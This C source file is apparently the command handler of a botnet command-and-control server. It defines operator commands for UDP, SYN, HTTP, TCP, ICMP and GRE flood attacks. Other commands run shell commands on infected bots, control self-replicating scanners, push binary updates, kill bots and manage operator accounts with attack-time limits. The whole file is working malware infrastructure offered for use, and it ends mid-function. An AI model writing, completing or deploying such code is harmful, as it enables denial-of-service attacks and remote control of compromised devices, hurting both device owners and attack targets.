#include "headers/command_handler.h"
#include "headers/botnet.h"
#include "headers/checks.h"
#include "headers/user_handler.h"
#include "headers/attack_commands.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <stdbool.h>
#include <ctype.h>

int validate_ip_or_subnet(const char *ip);
void handle_openshell_command(const User *user, const char *command, int client_socket);

static char response_buf[MAX_COMMAND_LENGTH];
static char arch_cmd_buf[512];
static int valid_bot_count = 0;

void handle_bots_command(char *response);
void handle_clear_command(char *response);
void handle_stopall_command(const User *user, char *response);
void handle_user_command(const User *user, const char *command, char *response);
void handle_adduser_command(const User *user, int client_socket);
void handle_removeuser_command(const User *user, const char *command, char *response);
void handle_kickuser_command(const User *user, const char *command, char *response);
void handle_admin_command(const User *user, char *response);
void handle_ping_command(char *response);
void handle_botdump_command(const User *user, char *response, const char *sarch, const char *sgroup, const char *filename);
void handle_selfrep_command(const User *user, const char *command, char *response, const char *scanner_type, const char *action, const char *sarch, const char *sgroup);
void handle_update_command(const User *user, char *response);

/*
H E L P   C O M M A N D
*/
void handle_help_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             LIGHT_BLUE "!misc" YELLOW " - " RESET "shows misc commands\r\n"
             LIGHT_BLUE "!attack" YELLOW " - " RESET "shows attack methods\r\n"
             LIGHT_BLUE "!admin" YELLOW " - " RESET "show admin and root commands\r\n"
             LIGHT_BLUE "!help" YELLOW " - " RESET "shows this msg\r\n" RESET);
}

/*
M I S C   C O M M A N D S
*/
void handle_misc_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             LIGHT_BLUE "!kill" YELLOW " - " RESET "kicks/triggers self destruct on bots\r\n"
             LIGHT_BLUE "!stopall" YELLOW " - " RESET "stops all atks\r\n"
             LIGHT_BLUE "!update" YELLOW " - " RESET "Update binary on all bots\r\n"
             LIGHT_BLUE "!opthelp" YELLOW " - " RESET "see attack options\r\n"
             LIGHT_BLUE "!bots" YELLOW " - " RESET "list bots\r\n"
             LIGHT_BLUE "!groups" YELLOW " - " RESET "list bot groups\r\n"
             LIGHT_BLUE "!user" YELLOW " - " RESET "show user or other users\r\n"
             LIGHT_BLUE "!selfrep" YELLOW " - " RESET "control scanners\r\n"
             LIGHT_BLUE "!clear" YELLOW " - " RESET "clear screen\r\n"
             LIGHT_BLUE "!exit" YELLOW " - " RESET "leave CNC\r\n" RESET);
}

/*
ATK LIST   C O M M A N D
*/
void handle_attack_list_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             LIGHT_BLUE "!udp" YELLOW " - " RESET "Generic UDP Flood\r\n"
             LIGHT_BLUE "!syn" YELLOW " - " RESET "TCP SYN Flood\r\n"
             LIGHT_BLUE "!http" YELLOW " - " RESET "HTTP Flood\r\n"
             LIGHT_BLUE "!tcp" YELLOW " - " RESET "TCP Stream Flood\r\n"
             LIGHT_BLUE "!icmp" YELLOW " - " RESET "ICMP Flood\r\n"
             LIGHT_BLUE "!gre" YELLOW " - " RESET "GRE Flood\r\n"
             LIGHT_BLUE "!udpplain" YELLOW " - " RESET "Plain UDP Flood\r\n" RESET);
}

/*
OPTHELP   C O M M A N D
*/
void handle_opthelp_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             RESET "Optional Arguments:\r\n"
             LIGHT_BLUE "filename" YELLOW " - " RESET "Specifies file name of dumped|shell(ed) bots\r\n"
             LIGHT_BLUE "usleep" YELLOW " - " RESET "Select delay (usleep=min-max or usleep=delay)\r\n"
             LIGHT_BLUE "msg" YELLOW " - " RESET "select static msg for attack (if not = rand hex)\r\n"
             LIGHT_BLUE "bot" YELLOW " - " RESET "select specific bot for openshell (to avoid killing all)\r\n"
             LIGHT_BLUE "sarch" YELLOW " - " RESET "select from arch group\r\n"
             LIGHT_BLUE "sgroup" YELLOW " - " RESET "select from group of arch\r\n"
             LIGHT_BLUE "psize" YELLOW " - " RESET "Packet size | max: 1500\r\n"
             LIGHT_BLUE "srcport" YELLOW " - " RESET "Src port for UDP/SYN/GRE | Default=Random\r\n"
             LIGHT_BLUE "botcount" YELLOW " - " RESET "Limit number of bots to use\r\n"
             LIGHT_BLUE "proto" YELLOW " - " RESET "GRE Protocol tcp/udp default=IP\r\n"
             LIGHT_BLUE "gport" YELLOW " - " RESET "GRE Destination port\r\n"
             LIGHT_BLUE "httpmode" YELLOW " - " RESET "HTTP Method (get,post,head) default=GET\r\n" RESET);
}

void process_command(const User *user, const char *command, int client_socket, const char *user_ip) {
    if (strlen(command) == 0) return;

    log_command(user->user, user_ip, command);

    if (is_attack_command(command)) {
        pthread_mutex_lock(&cooldown_mutex);
        if (global_cooldown > 0) {
            snprintf(response_buf, sizeof(response_buf), RESET "\rGlobal cooldown still active for " YELLOW "%d seconds" RESET "\n", global_cooldown);
            pthread_mutex_unlock(&cooldown_mutex);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        pthread_mutex_unlock(&cooldown_mutex);
    }

    if (strncmp(command, "!kill", 5) == 0) {
        if (!user->is_admin) {
            snprintf(response_buf, sizeof(response_buf), RED "Only admins can use !kill command\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        char sarch[32] = {0};
        char sgroup[64] = {0};
        char bot_ip[64] = {0};
        int has_sarch = 0, has_sgroup = 0, has_botip = 0, unknown_arg = 0;
        if (strlen(command) > 5) {
            char *args = (char *)(command + 5);
            while (*args == ' ') args++;
            char *token = strtok(args, " ");
            while (token) {
                if (strncmp(token, "sarch=", 6) == 0) {
                    strncpy(sarch, token + 6, sizeof(sarch) - 1);
                    sarch[sizeof(sarch) - 1] = 0;
                    has_sarch = 1;
                } else if (strncmp(token, "sgroup=", 7) == 0) {
                    strncpy(sgroup, token + 7, sizeof(sgroup) - 1);
                    sgroup[sizeof(sgroup) - 1] = 0;
                    has_sgroup = 1;
                } else if (strncmp(token, "bot=", 4) == 0) {
                    strncpy(bot_ip, token + 4, sizeof(bot_ip) - 1);
                    bot_ip[sizeof(bot_ip) - 1] = 0;
                    has_botip = 1;
                } else if (strlen(token) > 0) {
                    unknown_arg = 1;
                }
                token = strtok(NULL, " ");
            }
        }
        if (unknown_arg) {
            snprintf(response_buf, sizeof(response_buf), RED "Unknown argument for !kill. only sarch=, sgroup=, bot=x.x.x.x allowed\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        static const char* known_archs[] = {"arc", "powerpc", "sh4", "mips", "mipsel", "x86_64", "m68k", "sparc", "i486", "aarch64", "armv4l", "armv5l", "armv6l", "armv7l"};
        if (has_sarch) {
            int valid_arch = 0;
            for (size_t k = 0; k < sizeof(known_archs)/sizeof(known_archs[0]); k++) {
                if (strcmp(sarch, known_archs[k]) == 0) { valid_arch = 1; break; }
            }
            if (!valid_arch) {
                snprintf(response_buf, sizeof(response_buf), RED "Invalid arch for sarch=\n" RESET);
                send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
                return;
            }
        }
        pthread_mutex_lock(&bot_mutex);
        int sent_bots = 0;
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].is_valid) continue;
            int arch_match = 1;
            int group_match = 1;
            int ip_match = 1;
            if (has_sarch) {
                arch_match = 0;
                char *saveptr1;
                char sarch_copy[128];
                strncpy(sarch_copy, sarch, sizeof(sarch_copy)-1);
                sarch_copy[sizeof(sarch_copy)-1] = 0;
                char *tok = strtok_r(sarch_copy, ",", &saveptr1);
                while (tok) {
                    if (strcmp(tok, bots[i].arch) == 0) { arch_match = 1; break; }
                    tok = strtok_r(NULL, ",", &saveptr1);
                }
                if (!arch_match) continue;
            }
            if (has_sgroup) {
                group_match = 0;
                char *saveptr2;
                char sgroup_copy[128];
                strncpy(sgroup_copy, sgroup, sizeof(sgroup_copy)-1);
                sgroup_copy[sizeof(sgroup_copy)-1] = 0;
                char *tok2 = strtok_r(sgroup_copy, ",", &saveptr2);
                while (tok2) {
                    if (strcmp(tok2, bots[i].group) == 0) { group_match = 1; break; }
                    tok2 = strtok_r(NULL, ",", &saveptr2);
                }
                if (!group_match) continue;
            }
            if (has_botip) {
                char ipstr[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &bots[i].address.sin_addr, ipstr, sizeof(ipstr));
                if (strcmp(ipstr, bot_ip) != 0) continue;
            }
            sent_bots++;
        }
        pthread_mutex_unlock(&bot_mutex);
        if (sent_bots == 0) {
            snprintf(response_buf, sizeof(response_buf), RED "\rNo matching bots found\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        char confirm_msg[128];
        snprintf(confirm_msg, sizeof(confirm_msg), YELLOW "\rAre you sure you want to kill %d bots? Y to proceed: " RESET, sent_bots);
        send(client_socket, confirm_msg, strlen(confirm_msg), MSG_NOSIGNAL);
        
        char confirm_buf[8] = {0};
        ssize_t confirm_len = recv(client_socket, confirm_buf, sizeof(confirm_buf)-1, 0);
        
        if (confirm_len <= 0 || (confirm_buf[0] != 'Y' && confirm_buf[0] != 'y')) {
            snprintf(response_buf, sizeof(response_buf), RED "\rAborted. No bots killed\r\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        pthread_mutex_lock(&bot_mutex);
        int killed_bots = 0;
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].is_valid) continue;
            int arch_match = 1;
            int group_match = 1;
            int ip_match = 1;
            if (has_sarch) {
                arch_match = 0;
                char *saveptr1;
                char sarch_copy[128];
                strncpy(sarch_copy, sarch, sizeof(sarch_copy)-1);
                sarch_copy[sizeof(sarch_copy)-1] = 0;
                char *tok = strtok_r(sarch_copy, ",", &saveptr1);
                while (tok) {
                    if (strcmp(tok, bots[i].arch) == 0) { arch_match = 1; break; }
                    tok = strtok_r(NULL, ",", &saveptr1);
                }
                if (!arch_match) continue;
            }
            if (has_sgroup) {
                group_match = 0;
                char *saveptr2;
                char sgroup_copy[128];
                strncpy(sgroup_copy, sgroup, sizeof(sgroup_copy)-1);
                sgroup_copy[sizeof(sgroup_copy)-1] = 0;
                char *tok2 = strtok_r(sgroup_copy, ",", &saveptr2);
                while (tok2) {
                    if (strcmp(tok2, bots[i].group) == 0) { group_match = 1; break; }
                    tok2 = strtok_r(NULL, ",", &saveptr2);
                }
                if (!group_match) continue;
            }
            if (has_botip) {
                char ipstr[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &bots[i].address.sin_addr, ipstr, sizeof(ipstr));
                if (strcmp(ipstr, bot_ip) != 0) continue;
            }
            send(bots[i].socket, "!kill", 5, MSG_NOSIGNAL);
            killed_bots++;
        }
        pthread_mutex_unlock(&bot_mutex);
        snprintf(response_buf, sizeof(response_buf), GREEN "sent !kill to %d bots\n" RESET, killed_bots);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        return;
    }

    if (strcmp(command, "!help") == 0) {
        handle_help_command(response_buf);
    } else if (strcmp(command, "!misc") == 0) {
        handle_misc_command(response_buf);
    } else if (strcmp(command, "!admin") == 0) {
        handle_admin_command(user, response_buf);
    } else if (strcmp(command, "!attack") == 0) {
        handle_attack_list_command(response_buf);
    } else if (strcmp(command, "!bots") == 0) {
        handle_bots_command(response_buf);
    } else if (strcmp(command, "!ping") == 0) {
        handle_ping_command(response_buf);
    } else if (strncmp(command, "!botdump", 8) == 0) {
        char sarch[32] = {0};
        char sgroup[64] = {0};
        char filename[128] = {0};
        int has_sarch = 0, has_sgroup = 0, has_filename = 0;
        if (strlen(command) > 8) {
            char *args = (char *)(command + 8);
            while (*args == ' ') args++;
            char *token = strtok(args, " ");
            while (token) {
                if (strncmp(token, "sarch=", 6) == 0) {
                    strncpy(sarch, token + 6, sizeof(sarch) - 1);
                    sarch[sizeof(sarch) - 1] = 0;
                    has_sarch = 1;
                } else if (strncmp(token, "sgroup=", 7) == 0) {
                    strncpy(sgroup, token + 7, sizeof(sgroup) - 1);
                    sgroup[sizeof(sgroup) - 1] = 0;
                    has_sgroup = 1;
                } else if (strncmp(token, "filename=", 9) == 0) {
                    strncpy(filename, token + 9, sizeof(filename) - 1);
                    filename[sizeof(filename) - 1] = 0;
                    has_filename = 1;
                }
                token = strtok(NULL, " ");
            }
        }
        handle_botdump_command(user, response_buf, has_sarch ? sarch : NULL, has_sgroup ? sgroup : NULL, has_filename ? filename : NULL);
    } else if (strcmp(command, "!clear") == 0) {
        handle_clear_command(response_buf);
    } else if (strcmp(command, "!opthelp") == 0) {
        handle_opthelp_command(response_buf);
    } else if (strcmp(command, "!groups") == 0) {
        pthread_mutex_lock(&bot_mutex);
        static const char* arch_names[] = {"arc", "powerpc", "sh4", "mips", "mipsel", "x86_64", "m68k", "sparc", "i486", "aarch64", "armv4l", "armv5l", "armv6l", "armv7l"};
        const int num_known_archs = sizeof(arch_names)/sizeof(arch_names[0]);
        typedef struct { char group[64]; int count; } group_count_t;
        typedef struct { char arch[20]; group_count_t groups[128]; int group_count; } arch_groups_t;
        arch_groups_t archs[32];
        int arch_count = 0;
        for (int k = 0; k < num_known_archs; k++) {
            strncpy(archs[arch_count].arch, arch_names[k], sizeof(archs[arch_count].arch)-1);
            archs[arch_count].arch[sizeof(archs[arch_count].arch)-1] = 0;
            archs[arch_count].group_count = 0;
            arch_count++;
        }
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].is_valid) continue;
            int aidx = -1;
            for (int a = 0; a < arch_count; a++) {
                if (strcmp(bots[i].arch, archs[a].arch) == 0) { aidx = a; break; }
            }
            if (aidx == -1) continue;
            int gidx = -1;
            char groupbuf[64];
            strncpy(groupbuf, bots[i].group, sizeof(groupbuf)-1);
            groupbuf[sizeof(groupbuf)-1] = 0;
            for (int g = 0; g < archs[aidx].group_count; g++) {
                if (strcmp(archs[aidx].groups[g].group, groupbuf) == 0) { gidx = g; break; }
            }
            if (gidx == -1 && archs[aidx].group_count < 128) {
                gidx = archs[aidx].group_count++;
                strncpy(archs[aidx].groups[gidx].group, groupbuf, sizeof(archs[aidx].groups[gidx].group)-1);
                archs[aidx].groups[gidx].group[sizeof(archs[aidx].groups[gidx].group)-1] = 0;
                archs[aidx].groups[gidx].count = 0;
            }
            if (gidx != -1) {
                archs[aidx].groups[gidx].count++;
            }
        }
        int pos = 0;
        for (int a = 0; a < arch_count; a++) {
            int total = 0;
            for (int g = 0; g < archs[a].group_count; g++) {
                total += archs[a].groups[g].count;
            }
            if (total == 0) continue;
            pos += snprintf(response_buf+pos, sizeof(response_buf)-pos, GREEN "\r%s group: " RESET "%d\n", archs[a].arch, total);
            for (int g = 0; g < archs[a].group_count; g++) {
                if (archs[a].groups[g].count == 0) continue;
                pos += snprintf(response_buf+pos, sizeof(response_buf)-pos, LIGHT_BLUE "\r%s" RESET ": %d\n", archs[a].groups[g].group, archs[a].groups[g].count);
            }
        }
        if (arch_count == 0) {
            snprintf(response_buf, sizeof(response_buf), RESET "No bots connected\n" RESET);
        }
        pthread_mutex_unlock(&bot_mutex);
    } else if (strcmp(command, "!exit") == 0) {
        snprintf(response_buf, sizeof(response_buf), YELLOW "\rGoodbye!\n" RESET);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        close(client_socket);
        return;
    } else if (strncmp(command, "!user", 5) == 0) {
        handle_user_command(user, command, response_buf);
    } else if (strcmp(command, "!adduser") == 0) {
        handle_adduser_command(user, client_socket);
        return;
    } else if (strncmp(command, "!removeuser", 10) == 0) {
        handle_removeuser_command(user, command, response_buf);
    } else if (strncmp(command, "!kickuser", 9) == 0) {
        handle_kickuser_command(user, command, response_buf);
    } else if (strncmp(command, "!icmp", 5) == 0) {
        handle_icmp_command(user, command, response_buf);
    } else if (strncmp(command, "!gre", 4) == 0) {
        handle_gre_command(user, command, response_buf);
    } else if (strncmp(command, "!udpplain", 9) == 0) {
        handle_udpplain_command(user, command, response_buf);
    } else if (strncmp(command, "!udp", 4) == 0) {
        handle_udp_command(user, command, response_buf);
    } else if (strncmp(command, "!tcp", 4) == 0) {
        handle_tcp_command(user, command, response_buf);
    } else if (strncmp(command, "!syn", 4) == 0) {
        handle_syn_command(user, command, response_buf);
    } else if (strncmp(command, "!http", 5) == 0) {
        handle_http_command(user, command, response_buf);
    } else if (strncmp(command, "!selfrep", 8) == 0) {
        char sarch[32] = {0};
        char sgroup[64] = {0};
        int has_sarch = 0, has_sgroup = 0;
        char cmd_copy[256];
        strncpy(cmd_copy, command, sizeof(cmd_copy)-1);
        cmd_copy[sizeof(cmd_copy)-1] = 0;
        char *args = cmd_copy + 8;
        while (*args == ' ') args++;
        char *token = strtok(args, " ");
        char *main_args[4] = {0};
        int main_argc = 0;
        while (token) {
            if (strncmp(token, "sarch=", 6) == 0) {
                strncpy(sarch, token + 6, sizeof(sarch) - 1);
                sarch[sizeof(sarch) - 1] = 0;
                has_sarch = 1;
            } else if (strncmp(token, "sgroup=", 7) == 0) {
                strncpy(sgroup, token + 7, sizeof(sgroup) - 1);
                sgroup[sizeof(sgroup) - 1] = 0;
                has_sgroup = 1;
            } else if (main_argc < 3) {
                main_args[main_argc++] = token;
            }
            token = strtok(NULL, " ");
        }
        handle_selfrep_command(user, command, response_buf, main_args[0], main_args[1], has_sarch ? sarch : NULL, has_sgroup ? sgroup : NULL);
    } else if (strcmp(command, "!stopall") == 0) {
        handle_stopall_command(user, response_buf);
    } else if (strncmp(command, "!shell", 6) == 0) {
        if (!user->is_admin) {
            snprintf(response_buf, sizeof(response_buf), RESET "Error: only admins can use !shell\r\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        char ip[32] = {0};
        char shell_cmd[512] = {0};
        int arg_count = 0;
        char *tokens[127] = {0};
        char cmd_copy[1024];
        strncpy(cmd_copy, command, sizeof(cmd_copy)-1);
        cmd_copy[sizeof(cmd_copy)-1] = 0;
        char *tok = strtok(cmd_copy, " ");
        int t = 0;
        while (tok && t < 127) {
            tokens[t++] = tok;
            tok = strtok(NULL, " ");
        }
        arg_count = t;
        if (arg_count < 3) {
            snprintf(response_buf, sizeof(response_buf), RESET "usage: !shell <ip> <cmd>\r\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        strncpy(ip, tokens[1], sizeof(ip)-1);
        ip[sizeof(ip)-1] = 0;
        if (!validate_ip_or_subnet(ip) || strchr(ip, '/')) {
            snprintf(response_buf, sizeof(response_buf), RESET "Invalid IP\r\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        for (int i = 2; i < arg_count; i++) {
            if (shell_cmd[0]) strncat(shell_cmd, " ", sizeof(shell_cmd)-strlen(shell_cmd)-1);
            strncat(shell_cmd, tokens[i], sizeof(shell_cmd)-strlen(shell_cmd)-1);
        }
        if (shell_cmd[0] == 0) {
            snprintf(response_buf, sizeof(response_buf), RESET "No command given\r\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        pthread_mutex_lock(&bot_mutex);
        int sent = 0;
        int bot_sock = -1;
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].is_valid) continue;
            char bot_ip[32];
            strncpy(bot_ip, inet_ntoa(bots[i].address.sin_addr), sizeof(bot_ip)-1);
            bot_ip[sizeof(bot_ip)-1] = 0;
            if (strcmp(bot_ip, ip) != 0) continue;
            char shellmsg[600];
            snprintf(shellmsg, sizeof(shellmsg), "!shellcmd %s", shell_cmd);
            send(bots[i].socket, shellmsg, strlen(shellmsg), MSG_NOSIGNAL);
            sent = 1;
            bot_sock = bots[i].socket;
            break;
        }
        pthread_mutex_unlock(&bot_mutex);
        if (!sent) {
            snprintf(response_buf, sizeof(response_buf), RESET "IP not connected!\r\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        fd_set readfds;
        struct timeval tv;
        FD_ZERO(&readfds);
        FD_SET(bot_sock, &readfds);
        tv.tv_sec = 4;
        tv.tv_usec = 0;
        int sel = select(bot_sock+1, &readfds, NULL, NULL, &tv);
        if (sel > 0 && FD_ISSET(bot_sock, &readfds)) {
            char bot_reply[1024];
            ssize_t n = recv(bot_sock, bot_reply, sizeof(bot_reply)-1, MSG_NOSIGNAL);
            if (n >= 0) {
                bot_reply[n] = 0;
                if (n == 1 && bot_reply[0] == '\r') return;
                char crlf_reply[2048];
                int j = 0;
                for (int i = 0; i < n && j < (int)sizeof(crlf_reply) - 2; ++i) {
                    if (bot_reply[i] == '\n') {
                        crlf_reply[j++] = '\r';
                        crlf_reply[j++] = '\n';
                    } else if (bot_reply[i] != '\r') {
                        crlf_reply[j++] = bot_reply[i];
                    }
                }
                crlf_reply[j] = '\0';
                send(client_socket, crlf_reply, j, MSG_NOSIGNAL);
                return;
            }
        }
        snprintf(response_buf, sizeof(response_buf), RESET "Request timed out\r\n" RESET);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        return;
    } else if (strncmp(command, "!openshell", 10) == 0) {
        handle_openshell_command(user, command, client_socket);
        return;
    } else if (strcmp(command, "!update") == 0 ) {
        handle_update_command(user, response_buf);
    } else {
        snprintf(response_buf, sizeof(response_buf), RESET "\rCommand not found\n" RESET);
    }

    send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
}

void handle_bots_command(char *response) {
    #define NUM_ARCHS 16
    static int arch_count[NUM_ARCHS];
    static const char* arch_names[] = {"arc", "powerpc", "sh4", "mips", "mipsel", "x86_64", "m68k", "sparc", "i486", "aarch64", "armv4l", "armv5l", "armv6l", "armv7l", "unknown"};
    static int valid_bots;
    int offset;
    
    memset(arch_count, 0, sizeof(arch_count));
    valid_bots = 0;
    
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (!bots[i].is_valid) continue;
        
        int is_duplicate = 0;
        for (int j = 0; j < i; j++) {
            if (bots[j].is_valid && bots[j].address.sin_addr.s_addr == bots[i].address.sin_addr.s_addr) {
                is_duplicate = 1;
                break;
            }
        }
        if (is_duplicate) continue;
        
        valid_bots++;
        int found = 0;
        for (int j = 0; j < NUM_ARCHS-1 && !found; j++) {
            if (bots[i].arch != NULL && strcmp(bots[i].arch, arch_names[j]) == 0) {
                arch_count[j]++;
                found = 1;
            }
        }
        if (!found) {
            arch_count[NUM_ARCHS-1]++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    offset = snprintf(response, MAX_COMMAND_LENGTH, YELLOW "Total bots: " RESET "%d\n", valid_bots);
    for (int i = 0; i < NUM_ARCHS; i++) {
        if (arch_count[i] > 0) {
            const char *arch_name = arch_names[i] ? arch_names[i] : "unknown";
            offset += snprintf(response + offset, MAX_COMMAND_LENGTH - offset, LIGHT_BLUE "\r%s: " RESET "%d\r\n", arch_name, arch_count[i]);
        }
    }
}

void handle_clear_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH, "\033[H\033[J");
}

void handle_stopall_command(const User *user, char *response) {
    static int allow_stopall;
    static int stopped_count;
    static const char stop_cmd[] = "stop";
    
    allow_stopall = 0;
    stopped_count = 0;
    
    if (user->is_admin) {
        allow_stopall = 1;
    } else {
        FILE* sf = fopen("database/settings.txt", "r");
        if (sf) {
            char line[128] = {0};
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalstopall:", 13) == 0) {
                    allow_stopall = strstr(line, "yes") ? 1 : 0;
                    break;
                }
            }
            fclose(sf);
        }
    }

    if (!allow_stopall) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Error: You don't have permission to use !stopall\n" RESET);
        return;
    }

    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid && bots[i].socket > 0) {
            if (send(bots[i].socket, stop_cmd, strlen(stop_cmd), MSG_NOSIGNAL) > 0) {
                stopped_count++;
            }
        }
    }
    pthread_mutex_unlock(&bot_mutex);
    
    pthread_mutex_lock(&cooldown_mutex);
    global_cooldown = 0;
    pthread_mutex_unlock(&cooldown_mutex);
    
    snprintf(response, MAX_COMMAND_LENGTH, "\r" GREEN "Sent stop command to %d active bots\n" RESET, stopped_count);
}

void handle_user_command(const User *user, const char *command, char *response) {
    if (!user->is_admin) {
        FILE *sf = fopen("database/settings.txt", "r");
        int allow_non_admin = 0;
        if (sf) {
            char line[128];
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalusercommand:", 17) == 0 && strstr(line, "yes")) {
                    allow_non_admin = 1;
                    break;
                }
            }
            fclose(sf);
        }
        if (!allow_non_admin) {
            snprintf(response, MAX_COMMAND_LENGTH, RESET "\ronly admins can use !user command\r\n" RESET);
            return;
        }
    }
    
    char target_user[50] = {0};
    if (sscanf(command, "!user %49s", target_user) == 1) {
        int found = 0;
        for (int i = 0; i < user_count; i++) {
            if (strcmp(users[i].user, target_user) == 0) {
                snprintf(response, MAX_COMMAND_LENGTH,
                    YELLOW "Username: %s\r\n"
                    "Max time: %d\r\n"
                    "Max bots: %d\r\n"
                    "Admin: %s\r\n"
                    "Connected: %s\r\n" RESET,
                    users[i].user,
                    users[i].maxtime,
                    users[i].maxbots,
                    users[i].is_admin ? "yes" : "no",
                    users[i].is_logged_in ? "yes" : "no");
                found = 1;
                break;
            }
        }
        if (!found) {
            snprintf(response, MAX_COMMAND_LENGTH, RESET "User not found\r\n" RESET);
        }
    } else {
        snprintf(response, MAX_COMMAND_LENGTH,
            GREEN "Username: %s\r\n"
            "Max time: %d\r\n"
            "Max bots: %d\r\n"
            "Admin: %s\r\n"
            "Connected: yes\r\n" RESET,
            user->user,
            user->maxtime,
            user->maxbots,
            user->is_admin ? "yes" : "no");
    }
}

void handle_adduser_command(const User *user, int client_socket) {
    static char response[MAX_COMMAND_LENGTH];
    static char buffer[128];
    static char newuser[50];
    static char newpass[50];
    static char rootuser[50];
    static char tmp[256];
    static int maxtime, maxbots, is_admin;
    static int is_root;
    static ssize_t len;
    memset(newuser, 0, sizeof(newuser));
    memset(newpass, 0, sizeof(newpass));
    memset(rootuser, 0, sizeof(rootuser));
    is_root = 0;
    FILE *sf = fopen("database/settings.txt", "r");
    if (sf) {
        char line[128];
        while (fgets(line, sizeof(line), sf)) {
            if (strncmp(line, "rootuser:", 9) == 0) {
                sscanf(line + 9, " %49s", rootuser);
                if (strcmp(user->user, rootuser) == 0) {
                    is_root = 1;
                }
                break;
            }
        }
        fclose(sf);
    }
    if (!is_root) {
        snprintf(response, sizeof(response), RESET "Only root user can add users\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    snprintf(response, sizeof(response), BLUE "Username: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int uidx = 0;
    while (1) {
        len = recv(client_socket, buffer + uidx, sizeof(buffer) - 1 - uidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = uidx; i < uidx + len; i++) {
            if (buffer[i] == '\n' || buffer[i] == '\r') {
                buffer[i] = 0;
                found = 1;
                break;
            }
        }
        uidx += len;
        if (found) break;
        if (uidx >= (int)sizeof(buffer) - 1) return;
    }
    uidx = 0;
    for (int i = 0; buffer[i] && uidx < 49; i++) {
        char c = buffer[i];
        if (c == '\r' || c == '\n') break;
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '_') {
            newuser[uidx++] = c;
        }
    }
    newuser[uidx] = 0;
    if (strlen(newuser) < 3) {
        snprintf(response, sizeof(response), RESET "\r\nUsername must be at least 3 characters\r\n\r\n" RESET BLUE "Username: " RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, newuser) == 0) {
            snprintf(response, sizeof(response), RESET "\r\nUser already exists\r\n\r\n" RESET BLUE "Username: " RESET);
            send(client_socket, response, strlen(response), MSG_NOSIGNAL);
            return;
        }
    }
    snprintf(response, sizeof(response), BLUE "Password: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int pidx = 0;
    memset(buffer, 0, sizeof(buffer));
    while (1) {
        len = recv(client_socket, buffer + pidx, sizeof(buffer) - 1 - pidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = pidx; i < pidx + len; i++) {
            if (buffer[i] == '\n' || buffer[i] == '\r') {
                buffer[i] = 0;
                found = 1;
                break;
            }
        }
        pidx += len;
        if (found) break;
        if (pidx >= (int)sizeof(buffer) - 1) return;
    }
    pidx = 0;
    for (int i = 0; buffer[i] && pidx < 49; i++) {
        char c = buffer[i];
        if (c == '\r' || c == '\n') break;
        if (c >= 32 && c <= 126) {
            newpass[pidx++] = c;
        }
    }
    newpass[pidx] = 0;
    if (strlen(newpass) < 4) {
        snprintf(response, sizeof(response), RESET "Password must be at least 4 characters\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    snprintf(response, sizeof(response), BLUE "Admin (y/n): " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int adminidx = 0;
    memset(buffer, 0, sizeof(buffer));
    while (1) {
        len = recv(client_socket, buffer + adminidx, sizeof(buffer) - 1 - adminidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = adminidx; i < adminidx + len; i++) {
            char c = buffer[i];
            if (c == 'y' || c == 'Y' || c == 'n' || c == 'N') {
                is_admin = (c == 'y' || c == 'Y') ? 1 : 0;
                found = 1;
                break;
            }
        }
        adminidx += len;
        if (found) break;
        if (adminidx >= (int)sizeof(buffer) - 1) return;
    }
    snprintf(response, sizeof(response), BLUE "Max attack time (seconds): " RESET);
